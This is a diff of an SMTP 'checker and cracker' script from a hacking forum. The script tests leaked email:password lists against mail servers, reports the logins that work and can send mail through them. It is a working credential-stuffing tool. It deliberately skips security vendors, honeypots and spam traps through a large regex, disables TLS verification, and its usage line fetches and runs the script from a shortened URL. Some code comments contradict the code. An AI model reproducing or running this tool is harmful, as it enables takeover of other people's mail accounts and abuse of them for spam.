@@ -16,7 +16,7 @@ if not sys.version_info[0] > 2 and not sys.version_info[1] > 8:
 
 sys.stdout.reconfigure(encoding='utf-8')
 
-# ===== БЛОКИРОВКИ =====
+# Thread-safe locks
 goods_lock = threading.Lock()
 ignored_lock = threading.Lock()
 progress_lock = threading.Lock()
@@ -24,35 +24,32 @@ smtp_file_lock = threading.Lock()
 config_cache_lock = threading.Lock()
 thread_counter_lock = threading.Lock()
 
-# ===== КОНСТАНТЫ =====
+# mail providers where SMTP access is disabled by default
 bad_mail_servers = 'bk.ru,qq.com'
 
-# ОПТИМИЗАЦИЯ: оставляем только топ-5 DNS + системный
-custom_dns_nameservers = '1.1.1.1,1.0.0.1,8.8.8.8,8.8.4.4,9.9.9.9'.split(',')
+# fixed dns list (removed double comma)
+custom_dns_nameservers = '1.1.1.2,1.0.0.2,208.67.222.222,208.67.220.220,1.1.1.1,1.0.0.1,8.8.8.8,8.8.4.4,9.9.9.9,149.112.112.112,185.228.168.9,185.228.169.9,76.76.19.19,76.223.122.150,94.140.14.14,94.140.15.15,84.200.69.80,84.200.70.40,8.26.56.26,8.20.247.20,205.171.3.65,205.171.2.65,195.46.39.39,195.46.39.40,159.89.120.99,134.195.4.2,216.146.35.35,216.146.36.36,45.33.97.5,37.235.1.177,77.88.8.8,77.88.8.1,91.239.100.100,89.233.43.71,80.80.80.80,80.80.81.81,74.82.42.42,64.6.64.6,64.6.65.6,45.77.165.194,45.32.36.36'.split(',')
 
+# more dns servers url
 dns_list_url = 'https://public-dns.info/nameservers.txt'
+
+# expanded lists of SMTP endpoints
 autoconfig_data_url = 'https://raw.githubusercontent.com/solesfiwayne/tools/refs/heads/main/autoconfigs_enriched.txt'
 
-# УЛУЧШЕННЫЙ dangerous_domains (без ошибок)
-dangerous_domains = r'acronis|acros|adlice|alinto|appriver|aspav|atomdata|avanan|avast|barracuda|baseq|bitdefender|broadcom|btitalia|censornet|checkpoint|cisco|cistymail|clean-mailbox|clearswift|closedport|cloudflare|comforte|corvid|crsp|cyren|darktrace|data-mail-group|dmarcly|drweb|duocircle|e-purifier|earthlink-vadesecure|ecsc|eicar|elivescanned|eset|essentials|exchangedefender|fireeye|forcepoint|fortinet|gartner|gatefy|gonkar|guard|helpsystems|heluna|hosted-247|iberlayer|indevis|infowatch|intermedia|intra2net|invalid|ioactive|ironscales|isync|itserver|jellyfish|kcsfa.co|keycaptcha|krvtz|libraesva|link11|localhost|logix|mailborder.co|mailchannels|mailcleaner|mailcontrol|mailinator|mailroute|mailsift|mailstrainer|mcafee|mdaemon|mimecast|mx-relay|mxgate|mxstorm|n-able|n2net|nano-av|netintelligence|network-box|networkboxusa|newnettechnologies|newtonit.co|odysseycs|openwall|opswat|perfectmail|perimeterwatch|plesk|prodaft|proofpoint|proxmox|redcondor|reflexion|retarus|safedns|safeweb|sec-provider|secureage|securence|security|sendio|shield|sicontact|sonicwall|sophos|spamtitan|spfbl|spiceworks|stopsign|supercleanmail|techtarget|titanhq|trellix|trendmicro|trustifi|trustwave|tryton|uni-muenster|usergate|vadesecure|wessexnetworks|zillya|zyxel|virus|bot|trap|honey|lab|virtual|research|abus|security|filter|junk|spam|black|list'
+# fixed dangerous domains regex (escaped dots)
+dangerous_domains = r'acronis|acros|adlice|alinto|appriver|aspav|atomdata|avanan|avast|barracuda|baseq|bitdefender|broadcom|btitalia|censornet|checkpoint|cisco|cistymail|clean-mailbox|clearswift|closedport|cloudflare|comforte|corvid|crsp|cyren|darktrace|data-mail-group|dmarcly|drweb|duocircle|e-purifier|earthlink-vadesecure|ecsc|eicar|elivescanned|eset|essentials|exchangedefender|fireeye|forcepoint|fortinet|gartner|gatefy|gonkar|guard|helpsystems|heluna|hosted-247|iberlayer|indevis|infowatch|intermedia|intra2net|invalid|ioactive|ironscales|isync|itserver|jellyfish|kcsfa.co|keycaptcha|krvtz|libraesva|link11|localhost|logix|mailborder.co|mailchannels|mailcleaner|mailcontrol|mailinator|mailroute|mailsift|mailstrainer|mcafee|mdaemon|mimecast|mx-relay|mx1.ik2|mx37\.m\.\.p\.com|mxcomet|mxgate|mxstorm|n-able|n2net|nano-av|netintelligence|network-box|networkboxusa|newnettechnologies|newtonit.co|odysseycs|openwall|opswat|perfectmail|perimeterwatch|plesk|prodaft|proofpoint|proxmox|redcondor|reflexion|retarus|safedns|safeweb|sec-provider|secureage|securence|security|sendio|shield|sicontact|sonicwall|sophos|spamtitan|spfbl|spiceworks|stopsign|supercleanmail|techtarget|titanhq|trellix|trendmicro|trustifi|trustwave|tryton|uni-muenster|usergate|vadesecure|wessexnetworks|zillya|zyxel|fucking-shit|please|kill-me-please|virus|bot|trap|honey|lab|virtual|vm\d|research|abus|security|filter|junk|rbl|ubl|spam|black|list|bad|brukalai|metunet|excello'
 
-dangerous_regex = None
-try:
-    dangerous_regex = re.compile(dangerous_domains, re.IGNORECASE)
-except Exception as e:
-    print(f'Warning: Failed to compile dangerous_regex: {e}')
-
-# ===== ГЛОБАЛЬНЫЕ =====
-b = '\033[1m'
-z = '\033[0m'
-wl = '\033[2K'
-up = '\033[F'
+b   = '\033[1m'
+z   = '\033[0m'
+wl  = '\033[2K'
+up  = '\033[F'
 err = b+'[\033[31mx\033[37m] '+z
 okk = b+'[\033[32m+\033[37m] '+z
 wrn = b+'[\033[33m!\033[37m] '+z
 inf = b+'[\033[34mi\033[37m] '+z
 npt = b+'[\033[37m?\033[37m] '+z
 
+# EHLO base names
 EHLO_NAMES_BASE = [
     'mail-{rand}.local',
     'client-{uuid}.example.com',
@@ -67,15 +64,11 @@ def generate_ehlo_name():
         return name.replace('{uuid}', uuid.uuid4().hex[:8])
     return name
 
-ssl_context = ssl._create_unverified_context()
-
-# ===== DNS CACHE =====
 @lru_cache(maxsize=4096)
 def cached_dns_resolve(host, record_type):
     global resolver_obj
     return resolver_obj.resolve(host, record_type)
 
-# ===== ФУНКЦИИ =====
 def show_banner():
     banner = f"""
               ,▄   .╓███?                ,, .╓███)                              
@@ -86,28 +79,38 @@ def show_banner():
          |█|    `   ██/  ███▌╟█, (█████▌   ╙██▄▄███   @██▀`█  ██ ▄▌             
          ╟█          `    ▀▀  ╙█▀ `╙`╟█      `▀▀^`    ▀█╙  ╙   ▀█▀`             
          ╙█                           ╙                                         
-          ╙     {b}MadCat SMTP Checker & Cracker v54.12.15-FIXED{z}
-                Made by {b}Aels{z} for community: {b}https://xss.is{z}
+          ╙     {b}MadCat SMTP Checker & Cracker v44.12.15{z}
+                Made by {b}Aels{z} for community: {b}https://xss.is{z} - forum of security professionals
                 https://github.com/aels/mailtools
                 https://t.me/IamLavander
     """
     for line in banner.splitlines():
         print(line)
+        time.sleep(0.05)
 
-def red(s, type=0):
-    return f'\033[{str(type)};31m' + str(s) + z
+def red(s,type=0):
+    return f'\033[{str(type)};31m'+str(s)+z
 
-def green(s, type=0):
-    return f'\033[{str(type)};32m' + str(s) + z
+def green(s,type=0):
+    return f'\033[{str(type)};32m'+str(s)+z
 
-def orange(s, type=0):
-    return f'\033[{str(type)};33m' + str(s) + z
+def orange(s,type=0):
+    return f'\033[{str(type)};33m'+str(s)+z
 
-def blue(s, type=0):
-    return f'\033[{str(type)};34m' + str(s) + z
+def blue(s,type=0):
+    return f'\033[{str(type)};34m'+str(s)+z
+
+def violet(s,type=0):
+    return f'\033[{str(type)};35m'+str(s)+z
+
+def cyan(s,type=0):
+    return f'\033[{str(type)};36m'+str(s)+z
+
+def white(s,type=0):
+    return f'\033[{str(type)};37m'+str(s)+z
 
 def bold(s):
-    return b + str(s) + z
+    return b+str(s)+z
 
 def num(s):
     return f'{int(s):,}'
@@ -163,7 +166,15 @@ def load_smtp_configs():
                 continue
             domain_configs_cache[line[0]] = (line[1].split(','), line[2])
     except Exception as e:
-        print(err+'failed to load SMTP configs. '+str(e)+' performance will be affected.')
+        print(err+'failed to load SMTP configs. '+str(e))
+        print(err+'performance will be affected.')
+    
+    if dangerous_regex is None:
+        try:
+            dangerous_regex = re.compile(dangerous_domains, re.IGNORECASE)
+        except Exception as e:
+            print(f'Warning: Failed to compile dangerous_regex: {e}')
+            dangerous_regex = None
 
 def bytes_to_mbit(b):
     return round(b/1024./1024.*8, 2)
@@ -180,22 +191,23 @@ def read(path):
 def read_lines(path):
     return read(path).splitlines()
 
+# Удаляем is_listening() - не нужна
+
 def get_rand_ip_of_host(host, attempt=0):
     global resolver_obj
-    if attempt > 3:
-        raise Exception('DNS resolution failed after 3 attempts')
+    if attempt > 10:
+        raise Exception('DNS resolution failed after 10 attempts')
     try:
         try:
             host = cached_dns_resolve(host, 'cname')[0].target
         except:
             pass
-        
+        # Исправленная IPv6 логика
         use_ipv6 = bool(socket.has_ipv6 and socket.has_ipv6 != '-' and socket.has_ipv6 != False)
         try:
             ip_array = cached_dns_resolve(host, 'aaaa' if use_ipv6 else 'a')
         except:
             ip_array = cached_dns_resolve(host, 'a')
-        
         ip = str(random.choice(ip_array))
         debug('get ip: '+ip)
         return ip
@@ -204,20 +216,21 @@ def get_rand_ip_of_host(host, attempt=0):
         if reason in str(e):
             switch_dns_nameserver()
             return get_rand_ip_of_host(host, attempt+1)
-        raise Exception('No A/AAAA record for '+host+' ('+str(e).lower()+')')
+        raise Exception('No A/AAAA record found for '+host+' ('+str(e).lower()+')')
+
+# Удаляем get_alive_neighbor() - не нужна
 
 def guess_smtp_server(domain):
     global default_login_template, resolver_obj, domain_configs_cache, dangerous_regex
     domains_arr = [domain, 'smtp-qa.'+domain, 'smtp.'+domain, 'mail.'+domain, 'webmail.'+domain, 'mx.'+domain]
     mx_domain = None
-    
     try:
         mx_records = list(resolver_obj.resolve(domain, 'mx'))
         for mx in mx_records:
             mx_candidate = str(mx.exchange).rstrip('.')
             is_dangerous = (dangerous_regex and dangerous_regex.search(mx_candidate))
             is_outlook = re.search(r'\.outlook\.com$', mx_candidate)
-            if not is_dangerous or is_outlook:
+            if not (is_dangerous and not is_outlook):
                 domains_arr.append(mx_candidate)
                 mx_domain = mx_candidate
                 break
@@ -226,12 +239,11 @@ def guess_smtp_server(domain):
         if reason in str(e):
             switch_dns_nameserver()
             return guess_smtp_server(domain)
-        raise Exception('no MX records for: '+domain)
+        raise Exception('no MX records found for: '+domain)
     
     if mx_domain and re.search(r'protection\.outlook\.com$', mx_domain):
         return domain_configs_cache.get('outlook.com', ([], default_login_template))
     
-    # ✅ ВОЗВРАЩЕНА правильная логика
     for host in domains_arr:
         try:
             ip = get_rand_ip_of_host(host)
@@ -239,21 +251,20 @@ def guess_smtp_server(domain):
             continue
         for port in [2525, 587, 465, 25]:
             debug(f'trying {host}, {ip}:{port}')
-            # БЫСТРАЯ проверка без лишних функций
-            socket_type = socket.AF_INET6 if ':' in ip else socket.AF_INET
-            test_sock = socket.socket(socket_type, socket.SOCK_STREAM)
-            test_sock.settimeout(3)
+            # Быстрая попытка подключения вместо is_listening
             try:
+                socket_type = socket.AF_INET6 if ':' in ip else socket.AF_INET
+                s = socket.socket(socket_type, socket.SOCK_STREAM)
+                s.settimeout(2)
                 if port == 465:
-                    test_sock = ssl_context.wrap_socket(test_sock, server_hostname=ip)
-                test_sock.connect((ip, port))
-                test_sock.close()
+                    context = ssl._create_unverified_context()
+                    s = context.wrap_socket(s, server_hostname=ip)
+                s.connect((ip, port))
+                s.close()
                 return ([host+':'+str(port)], default_login_template)
             except:
-                test_sock.close()
                 continue
-    
-    raise Exception('no connection details for '+domain)
+    raise Exception('no connection details found for '+domain)
 
 def get_smtp_config(domain):
     global domain_configs_cache, default_login_template, config_cache_lock
@@ -271,6 +282,7 @@ def is_valid_email(email):
     return re.match(r'^[\w.+-]+@[\w.-]+\.[A-Za-z]{2,}$', email)
 
 def find_email_password_collumnes(list_filename):
+    email_collumn = False
     try:
         with open(list_filename, 'r', encoding='utf-8-sig', errors='ignore') as fp:
             for i, line in enumerate(fp):
@@ -280,17 +292,17 @@ def find_email_password_collumnes(list_filename):
                 email = re.search(r'[\w.+-]+@[\w.-]+\.[a-z]{2,}', line)
                 if email:
                     email_collumn = line.split(email[0])[0].count(':')
-                    password_collumn = email_collumn + 1
+                    password_collumn = email_collumn+1
                     if re.search(r'@[\w.-]+\.[a-z]{2,}:.+123', line):
                         password_collumn = line.count(':') - re.split(r'@[\w.-]+\.[a-z]{2,}:.+123', line)[-1].count(':')
                     return (email_collumn, password_collumn)
     except Exception as e:
         raise Exception(f'Error reading file: {e}')
-    raise Exception('file does not contain emails')
+    raise Exception('the file you provided does not contain emails')
 
 def wc_count(filename):
     try:
-        with open(filename, 'rb') as file_handle:
+        with open(filename, 'rb') as file_handle:  # Исправлено: теперь закрывается
             lines = 0
             while True:
                 buf = file_handle.read(1024*1024)
@@ -323,17 +335,12 @@ def socket_get_free_smtp_server(smtp_server, port):
     s.settimeout(5)
     try:
         if port == 465:
-            s = ssl_context.wrap_socket(s, server_hostname=smtp_server_ip)
+            context = ssl._create_unverified_context()
+            s = context.wrap_socket(s, server_hostname=smtp_server_ip)
         s.connect((smtp_server_ip, port))
     except Exception as e:
-        if re.search(r'too many connections|threshold|parallel|try later|refuse', str(e).lower()):
-            # Альтернатива get_alive_neighbor: просто повтор через другой DNS
-            switch_dns_nameserver()
-            time.sleep(random.uniform(1, 2))
-            smtp_server_ip = get_rand_ip_of_host(smtp_server)
-            s.connect((smtp_server_ip, port))
-        else:
-            raise Exception(e)
+        # Удалена логика get_alive_neighbor - просто raise
+        raise Exception(e)
     return s
 
 def socket_try_tls(sock, self_host):
@@ -341,7 +348,8 @@ def socket_try_tls(sock, self_host):
     if 'starttls' in answer.lower():
         answer = socket_send_and_read(sock, 'STARTTLS')
         if answer[:3] == '220':
-            sock = ssl_context.wrap_socket(sock)
+            context = ssl._create_unverified_context()
+            sock = context.wrap_socket(sock)
     return sock
 
 def socket_try_login(sock, self_host, smtp_login, smtp_password):
@@ -361,13 +369,28 @@ def socket_try_login(sock, self_host, smtp_login, smtp_password):
             return sock
     raise Exception(answer)
 
-def smtp_connect_with_retry(smtp_server, port, login_template, smtp_user, password, max_retries=3):
+def socket_try_mail(sock, smtp_from, smtp_to, data):
+    answer = socket_send_and_read(sock, f'MAIL FROM: <{smtp_from}>')
+    if answer[:3] == '250':
+        answer = socket_send_and_read(sock, f'RCPT TO: <{smtp_to}>')
+        if answer[:3] == '250':
+            answer = socket_send_and_read(sock, 'DATA')
+            if answer[:3] == '354':
+                answer = socket_send_and_read(sock, data)
+                if answer[:3] == '250':
+                    socket_send_and_read(sock, 'QUIT')
+                    sock.close()
+                    return True
+    sock.close()
+    raise Exception(answer)
+
+def smtp_connect_with_retry(smtp_server, port, login_template, smtp_user, password, max_retries=2):
     for attempt in range(max_retries):
         try:
             return smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password)
         except Exception as e:
-            if attempt < max_retries - 1 and ('try later' in str(e).lower() or 'threshold' in str(e).lower() or 'too many' in str(e).lower()):
-                wait = (2 ** attempt) + random.uniform(0.5, 1.5)
+            if attempt < max_retries - 1 and ('try later' in str(e).lower() or 'threshold' in str(e).lower()):
+                wait = (2 ** attempt) * 0.5
                 time.sleep(wait)
                 continue
             raise
@@ -427,7 +450,7 @@ def worker_item(jobs_que, results_que):
                 results_que.put(blue('connecting to')+f' {smtp_server}|{port}|{smtp_user}')
                 
                 if smtp_connect_with_retry(smtp_server, port, login_template, smtp_user, password):
-                    results_que.put(green(smtp_user+':\a'+password,7)+(verify_email and green(' sent to '+verify_email,7)))
+                    results_que.put(green(smtp_user+':\a'+password, 7)+(verify_email and green(' sent to '+verify_email, 7)))
                     
                     with goods_lock:
                         goods += 1
@@ -444,15 +467,13 @@ def worker_item(jobs_que, results_que):
             except Exception as e:
                 results_que.put(orange((smtp_server and port and smtp_server+':'+port+' - ' or '')+', '.join(str(e).splitlines()).strip()))
             
-            # АДАПТИВНАЯ задержка (быстрая, но защищает от бана)
-            time.sleep(random.uniform(0.01, 0.1))
-            
+            # Удален human_like_delay() вызов
             loop_times.append(time.perf_counter() - time_start)
             while len(loop_times) > min_threads:
                 loop_times.pop(0)
     
     except BaseException as e:
-        results_que.put(err+f'[FATAL] Thread crashed: {e}')
+        results_que.put(err+'[FATAL] Thread crashed: '+str(e))
     
     finally:
         with thread_counter_lock:
@@ -480,7 +501,7 @@ def every_second():
             net_usage_old += net_usage
             loop_time = round(sum(loop_times)/len(loop_times), 2) if len(loop_times) else 0
             
-            if threads_counter < max_threads and mem_usage < 80 and cpu_usage < 80 and jobs_que.qsize():
+            if threads_counter<max_threads and mem_usage<80 and cpu_usage<80 and jobs_que.qsize():
                 threading.Thread(target=worker_item, args=(jobs_que, results_que), daemon=True).start()
                 with thread_counter_lock:
                     threads_counter += 1
@@ -523,10 +544,9 @@ def printer(jobs_que, results_que):
                 with progress_lock:
                     progress += 1
         
-        print(wl+'\n'.join(thread_statuses+[status_bar+up]))
+        print(wl+'\n'.join(thread_statuses+[status_bar+ up]))
         time.sleep(0.04)
 
-# ===== MAIN =====
 signal.signal(signal.SIGINT, quit)
 show_banner()
 tune_network()
@@ -535,10 +555,10 @@ check_ipv4_blacklists()
 check_ipv6()
 
 try:
-    help_message = f'usage: \n{npt}python3 <(curl -slkSL bit.ly/madcatsmtp) '+bold('list.txt')+' [verify_email@example.com] [ignored,email,domains] [start_from_line] [debug] [rage]'
+    help_message = f'usage: \n{npt}python3 <(curl -slkSL bit.ly/madcatsmtp) '+bold('list.txt')+' [verify_email@example.com] [ignored,email,domains] [start_from_line] [debug]'
     list_filename = ([i for i in sys.argv if os.path.isfile(i) and sys.argv[0] != i]+['']).pop(0)
     verify_email = ([i for i in sys.argv if is_valid_email(i)]+['']).pop(0)
-    exclude_mail_hosts = ','.join([i for i in sys.argv if re.match(r'[\w.,-]+$', i) and not os.path.isfile(i) and not re.match(r'(\d+|debug|rage)$', i)]+[bad_mail_servers])
+    exclude_mail_hosts = ','.join([i for i in sys.argv if re.match(r'[\w.,-]+$', i) and not os.path.isfile(i) and not re.match(r'(\d+|debug)$', i)]+[bad_mail_servers])
     start_from_line = int(([i for i in sys.argv if re.match(r'\d+$', i)]+[0]).pop(0))
     debuglevel = len([i for i in sys.argv if i == 'debug'])
     rage_mode = len([i for i in sys.argv if i == 'rage'])
@@ -566,8 +586,7 @@ try:
 except Exception as e:
     exit(err+red(e))
 
-# УВЕЛИЧЕННАЯ очередь для стабильности
-jobs_que = queue.Queue(maxsize=10000)
+jobs_que = queue.Queue(maxsize=5000)  # Увеличен размер очереди
 results_que = queue.Queue()
 ignored = 0
 goods = 0
@@ -631,4 +650,4 @@ with open(list_filename, 'r', encoding='utf-8-sig', errors='ignore') as fp:
         time.sleep(0.04)
 
 time.sleep(1)
-print('\r\n'+okk+green('well done. bye.', 1))
+print('\r\n'+okk+green('well done. bye.',1))
